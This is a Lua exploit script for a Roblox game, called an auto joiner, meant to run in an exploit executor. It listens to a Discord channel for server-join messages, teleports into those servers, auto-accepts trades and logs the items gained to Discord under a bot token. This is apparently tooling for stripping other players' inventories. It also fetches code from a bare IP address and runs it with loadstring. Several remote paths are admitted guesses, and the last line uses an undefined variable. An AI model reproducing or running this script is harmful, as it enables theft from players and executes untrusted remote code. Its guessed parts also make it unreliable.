--[[
    WESTERIA AUTO JOINER
    Place this loader ABOVE this script:
        bottoken    = "Bot TOKEN HERE"
        logid       = "LOG CHANNEL ID"
        chanelid    = "COMMAND CHANNEL ID"
        tradesbeforenext = 3   -- trades before moving to next server
        minrarity   = "Godly"  -- minimum rarity to log
]]

if getgenv().__westeria_autojoiner_loaded then return end
getgenv().__westeria_autojoiner_loaded = true

repeat task.wait() until game:IsLoaded()

local WESTERIA_PLACE = 286090429  -- Westeria place ID

local HttpService    = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService   = game:GetService("TeleportService")
local LocalPlayer       = game.Players.LocalPlayer

-- anti-idle
for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
    b:Disable()
end

local exec, execver = identifyexecutor()
totalval   = 0
tradesd    = 0
minrarity  = minrarity or "Godly"

-- ─── FILE HELPERS ────────────────────────────────────────────────────────────

local function readlist(file)
    local ok, t = pcall(function() return HttpService:JSONDecode(readfile(file)) end)
    if ok and type(t) == "table" then return t end
    return {}
end
local function writelist(file, t)
    pcall(function() writefile(file, HttpService:JSONEncode(t)) end)
end
local function inlist(file, value)
    for _, v in ipairs(readlist(file)) do
        if v == value then return true end
    end
    return false
end
local function addtolist(file, value)
    local t = readlist(file)
    for _, v in ipairs(t) do if v == value then return end end
    table.insert(t, value)
    writelist(file, t)
end

for _, f in ipairs({"jnubs.txt","queue.txt"}) do
    if not isfile(f) then writefile(f, "[]") end
end
if not isfile("nub.txt") then writefile("nub.txt", "nub") end

-- ─── RARITY / VALUE ──────────────────────────────────────────────────────────

local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
local godlyIdx    = table.find(rarityTable, "Godly") or 6
local minzaml     = table.find(rarityTable, minrarity) or godlyIdx

-- value endpoint — swap this URL if you run your own price server
local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}

local function lookupValue(realName, itemType, rarity, chroma, year)
    local D = rarity
    if itemType == "Pet" then D = "Pet" end
    local v = string.lower(tostring(realName or ""))
    if chroma then v = "chroma " .. v; D = "Chroma" end
    if D == "Classic" then D = "Vintage" end
    local bucket = valueList[D]
    if not bucket then return nil end
    local t = string.lower(tostring(itemType or ""))
    local y = tostring(year or "")
    for _, key in ipairs({
        v,
        v.." ("..t..")",
        v.." "..t,
        v.." ("..y..")",
        v.." "..y,
        v.." "..t.." ("..y..")",
        v.." ("..t..") ("..y..")",
    }) do
        if bucket[key] then return bucket[key] end
    end
    return nil
end

-- ─── WESTERIA INVENTORY + TRADE REMOTES ──────────────────────────────────────
-- Westeria uses a knife/gun trading system similar to MM2.
-- Remote names are discovered at runtime so the script survives minor updates.

local TradeRemotes = {}

task.spawn(function()
    -- block until the trade remotes are replicated
    local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 30)
    if not tradeFolder then warn("[westeria] Trade folder not found in RS") return end

    -- map every RemoteFunction / RemoteEvent we need
    for _, child in ipairs(tradeFolder:GetDescendants()) do
        TradeRemotes[child.Name] = child
    end
end)

local databrainrot
task.spawn(function()
    -- Westeria mirrors MM2's Database.Sync weapons table; adjust path if different
    local ok, db = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database",30):WaitForChild("Sync",30))
    end)
    if ok and db then
        databrainrot = db.Weapons or db
    else
        warn("[westeria] Could not load Database.Sync — value lookups will use fallback")
        databrainrot = {}
    end
end)

local function getItemValue(dataid)
    if not databrainrot then return 0 end
    local entry = databrainrot[dataid]
    if not entry then return 0 end
    local value = lookupValue(entry.ItemName, entry.ItemType, entry.Rarity, entry.Chroma == true, entry.Year)
    if not value then
        local idx = table.find(rarityTable, entry.Rarity)
        value = (idx and idx >= godlyIdx) and 2 or 1
    end
    return value
end

local function getinv()
    -- Westeria exposes full inventory the same way MM2 does
    local ok, result = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name).Weapons.Owned
    end)
    if ok and result then return result end
    return {}
end

local urnubitems = {}
task.spawn(function() urnubitems = getinv() end)

local function ischanged()
    local current = getinv()
    local changes = {}
    local changed = false
    for item, amount in pairs(current) do
        local old = urnubitems[item] or 0
        if amount ~= old then changes[item] = amount - old; changed = true end
    end
    for item, old in pairs(urnubitems) do
        if current[item] == nil then changes[item] = -old; changed = true end
    end
    if changed then urnubitems = current; return true, changes end
    return false
end

-- ─── DISCORD LOGGING ─────────────────────────────────────────────────────────

local function discordPost(payload)
    local response = request({
        Url    = "https://discord.com/api/v10/channels/"..logid.."/messages",
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot "..bottoken,
            ["Content-Type"]  = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    if response.StatusCode ~= 200 then warn(response.Body) end
end

local function chang(inve)
    local new = {}
    local newval = 0
    for i, v in pairs(inve) do
        local value = getItemValue(i)
        table.insert(new, {name=i, amount=v, value=value})
        newval   = newval   + value * v
        totalval = totalval + value * v
    end
    table.sort(new, function(a,b) return (a.value*a.amount) > (b.value*b.amount) end)

    local lines = {}
    for _, v in ipairs(new) do
        table.insert(lines, string.format("%s (x%s) → %s Value", v.name, v.amount, v.value*v.amount))
    end

    discordPost({ embeds = {{
        title  = "Westeria Auto Joiner — Trade",
        color  = 0x3EED50,
        fields = {
            { name="Info",  value="```\n📱 Executor: "..exec.." "..execver.."\n💎 New items: "..newval.."\n💎 Total gained: "..totalval.."\n```" },
            { name="Items", value="```\n"..table.concat(lines,"\n").."\n```" }
        }
    }}})
end

function inv()
    local all = getinv()
    local neww, newwval = {}, 0
    for i, v in pairs(all) do
        local value = getItemValue(i)
        if databrainrot and databrainrot[i] then
            local idx = table.find(rarityTable, databrainrot[i].Rarity)
            if idx and idx >= minzaml then
                table.insert(neww, {name=i, amount=v, value=value})
                newwval = newwval + value * v
            end
        end
    end
    table.sort(neww, function(a,b) return (a.value*a.amount) > (b.value*b.amount) end)

    local lines = {}
    for _, v in ipairs(neww) do
        table.insert(lines, string.format("%s (x%s) → %s Value", v.name, v.amount, v.value*v.amount))
    end
    -- trim to Discord's 1024-char field limit
    while #table.concat(lines,"\n") > 1014 and #lines > 0 do table.remove(lines) end

    discordPost({ embeds = {{
        title  = "Westeria Auto Joiner — Inventory",
        color  = 0x3EED50,
        fields = {
            { name="Info",      value="```\n📱 Executor: "..exec.." "..execver.."\n💎 Inventory value: "..newwval.."\n```" },
            { name="Inventory", value="```\n"..table.concat(lines,"\n").."\n```" }
        }
    }}})
end

invf = inv   -- alias so .invf command still works

-- ─── TRADE MONITOR ───────────────────────────────────────────────────────────
-- Westeria fires UpdateTrade / AcceptTrade / DeclineTrade / AcceptRequest
-- exactly like MM2 does. If your Westeria fork renamed them, update TradeRemotes keys.

local function trads()
    local ok, status = pcall(function()
        return TradeRemotes["GetTradeStatus"]:InvokeServer()
    end)
    if ok then return status end
    return nil
end

-- auto-accept incoming trade requests
task.spawn(function()
    local updateTrade = ReplicatedStorage:WaitForChild("Trade",30) and
                        ReplicatedStorage.Trade:WaitForChild("UpdateTrade",30)
    if not updateTrade then warn("[westeria] UpdateTrade not found") return end

    updateTrade.OnClientEvent:Connect(function(nub)
        if nub.LastOffer then
            local lastofer = nub.LastOffer
            while true do
                if nub.LastOffer ~= lastofer then break end
                pcall(function()
                    TradeRemotes["AcceptTrade"]:FireServer(game.PlaceId * 3, nub.LastOffer)
                end)
                task.wait(0.1)
            end
        end
    end)
end)

-- dismiss device-select prompt if Westeria has one
task.spawn(function()
    local gui = LocalPlayer.PlayerGui:WaitForChild("DeviceSelect", 10)
    if not gui then return end
    while gui.Parent do
        pcall(function() firesignal(gui.Container.Phone.Button.MouseButton1Click) end)
        task.wait(0.1)
    end
end)

-- main trade state machine
task.spawn(function()
    while true do
        local status = trads()
        if status == "StartTrade" then
            local timeintrade = 0
            repeat
                timeintrade = timeintrade + task.wait(0.1)
                if timeintrade >= 7 then
                    pcall(function() TradeRemotes["DeclineTrade"]:FireServer() end)
                    break
                end
            until trads() ~= "StartTrade"
            local ok, changes = ischanged()
            if ok then
                tradesd = tradesd + 1
                chang(changes)
            end
        elseif status == "ReceivingRequest" then
            pcall(function() TradeRemotes["AcceptRequest"]:FireServer() end)
        end
        task.wait(0.1)
    end
end)

-- ─── JOIN LOGIC ──────────────────────────────────────────────────────────────

local function playerleft()
    local target = readfile("nub.txt")
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name == target then return false end
    end
    return true
end

local function readytojoin()
    return tradesd >= tradesbeforenext or playerleft()
end

local teleporting   = false
local lastMessageId = nil
local currentTarget = nil

local function react(msgid, emoji)
    pcall(function()
        request({
            Url    = "https://discord.com/api/v10/channels/"..chanelid.."/messages/"..msgid.."/reactions/"..HttpService:UrlEncode(emoji).."/@me",
            Method = "PUT",
            Headers = { ["Authorization"] = "Bot "..bottoken }
        })
    end)
end

local function fetchMessages(afterId)
    local url = "https://discord.com/api/v10/channels/"..chanelid.."/messages?limit=50"
    if afterId then url = url.."&after="..afterId end
    local ok, response = pcall(function()
        return request({ Url=url, Method="GET", Headers={["Authorization"]="Bot "..bottoken} })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, decoded = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and type(decoded) == "table" then return decoded end
    end
    return {}
end

local function checkMessagesWhileTeleporting()
    while teleporting do
        local msgs = fetchMessages(lastMessageId)
        for i = #msgs, 1, -1 do processJoinMessage(msgs[i]) end  -- forward-declared below
        if msgs[1] then lastMessageId = msgs[1].id end
        task.wait(1)
    end
end

function teleportTo(placeId, jobId, msgid)
    currentTarget = { placeId=tonumber(placeId), jobId=jobId, msgid=msgid }
    if teleporting then return end
    teleporting = true
    task.spawn(checkMessagesWhileTeleporting)

    task.spawn(function()
        local failed = false
        local conn = TeleportService.TeleportInitFailed:Connect(function(player)
            if player == LocalPlayer then failed = true end
        end)
        while teleporting do
            local target = currentTarget
            failed = false
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(target.placeId, target.jobId, LocalPlayer)
            end)
            if ok and target.msgid then addtolist("jnubs.txt", target.msgid) end
            local t = 0
            while t < 5 and not failed and currentTarget == target do
                task.wait(0.5); t = t + 0.5
            end
            if currentTarget == target then task.wait(2) end
        end
        conn:Disconnect()
    end)
end

function processJoinMessage(messageData)
    if not messageData or not messageData.author then return end
    if messageData.channel_id and messageData.channel_id ~= chanelid then return end

    local content = messageData.content or ""
    local placeId, jobId = string.match(content, "(%d+),%s*'([^']+)'")
    if not (placeId and jobId) then
        placeId, jobId = string.match(content, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"')
    end
    if not (placeId and jobId) then return end

    -- only follow joins for Westeria
    if tonumber(placeId) ~= WESTERIA_PLACE then return end

    task.spawn(function() react(messageData.id, "✅") end)
    writefile("nub.txt", messageData.author.username)

    if inlist("jnubs.txt", messageData.id) then return end
    if jobId == game.JobId then return end

    if teleporting then
        teleportTo(placeId, jobId, messageData.id)
        return
    end

    local q = readlist("queue.txt")
    for _, j in ipairs(q) do if j.msgid == messageData.id then return end end
    table.insert(q, { placeId=placeId, jobId=jobId, msgid=messageData.id, author=messageData.author.username })
    writelist("queue.txt", q)
end

-- queue drain loop
task.spawn(function()
    while true do
        task.wait(1)
        if not teleporting and readytojoin() then
            local q = readlist("queue.txt")
            if #q > 0 then
                local job = table.remove(q, 1)
                writelist("queue.txt", q)
                if job and job.msgid and not inlist("jnubs.txt", job.msgid) and job.jobId ~= game.JobId then
                    teleportTo(job.placeId, job.jobId, job.msgid)
                end
            end
        end
    end
end)

-- ─── DISCORD GATEWAY ─────────────────────────────────────────────────────────

local socket, sequenceNumber, sessionId, resumeUrl
local shouldResume  = false
local connectionId  = 0
local readyConnId   = 0
local helloConnId   = 0

local function sendPayload(op, d)
    if not socket then return end
    pcall(function() socket:Send(HttpService:JSONEncode({op=op, d=d})) end)
end

local function connectgateway()
    connectionId = connectionId + 1
    local myId = connectionId
    local url  = "wss://gateway.discord.gg/?v=10&encoding=json"
    if shouldResume and resumeUrl then url = resumeUrl.."/?v=10&encoding=json" end

    print("[gateway] connecting (gen "..myId..")")
    socket = WebSocket.connect(url)

    socket.OnMessage:Connect(function(msg)
        if connectionId ~= myId then return end
        local data = HttpService:JSONDecode(msg)
        if data.s then sequenceNumber = data.s end

        if data.op == 10 then
            helloConnId = myId
            local hbi = data.d.heartbeat_interval / 1000
            if shouldResume and sessionId and sequenceNumber then
                print("[gateway] HELLO → RESUME")
                sendPayload(6, { token=bottoken, session_id=sessionId, seq=sequenceNumber })
            else
                print("[gateway] HELLO → IDENTIFY")
                sendPayload(2, {
                    token      = bottoken,
                    intents    = 33280,
                    properties = { os="linux", browser="opsec", device="desktop" }
                })
            end
            task.spawn(function()
                while connectionId == myId and socket do
                    task.wait(hbi)
                    if connectionId ~= myId then break end
                    sendPayload(1, sequenceNumber)
                end
            end)
        end

        if data.op == 0 and data.t == "READY" then
            sessionId  = data.d.session_id
            resumeUrl  = data.d.resume_gateway_url
            shouldResume = true
            readyConnId  = myId
            print("[gateway] READY")
            -- post inventory on fresh connect
            task.spawn(inv)
        end

        if data.op == 0 and data.t == "RESUMED" then
            readyConnId = myId
            print("[gateway] RESUMED")
        end

        if data.op == 7 then
            shouldResume = true
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 9 then
            shouldResume = (data.d == true)
            if not shouldResume then sessionId = nil end
            task.wait(math.random(1,5))
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 0 and data.t == "MESSAGE_CREATE" then
            local m = data.d
            if m.channel_id == chanelid then
                lastMessageId = m.id
                local cmd = m.content
                if cmd == ".inv" then
                    task.spawn(function() react(m.id,"✅") end); inv()
                elseif cmd == ".invf" then
                    task.spawn(function() react(m.id,"✅") end); invf()
                end
                processJoinMessage(m)
            end
        end
    end)

    if not socket then
        warn("[gateway] nil socket, retrying")
        task.wait(5 + math.random()*5)
        if connectionId == myId then connectgateway() end
        return
    end

    socket.OnClose:Connect(function()
        if connectionId ~= myId then return end
        warn("[gateway] closed, reconnecting")
        socket = nil
        if sessionId and sequenceNumber then shouldResume = true end
        task.wait(5 + math.random()*5)
        if connectionId == myId then connectgateway() end
    end)

    -- watchdog: dead socket / rate-limit detection
    task.spawn(function()
        task.wait(6)
        if connectionId == myId and helloConnId ~= myId then
            warn("[gateway] no HELLO — dead socket, retrying now")
            pcall(function() if socket then socket:Close() end end)
            if connectionId == myId then socket=nil; connectgateway() end
            return
        end
        if connectionId ~= myId then return end
        task.wait(8)
        if connectionId == myId and readyConnId ~= myId then
            warn("[gateway] HELLO but no READY — rate limited, backing off")
            pcall(function() if socket then socket:Close() end end)
            task.wait(3 + math.random()*4)
            if connectionId == myId then socket=nil; connectgateway() end
        end
    end)
end

connectgateway()
print("[westeria] loader done — "..string.format("%.2f", tick()-a).."s")
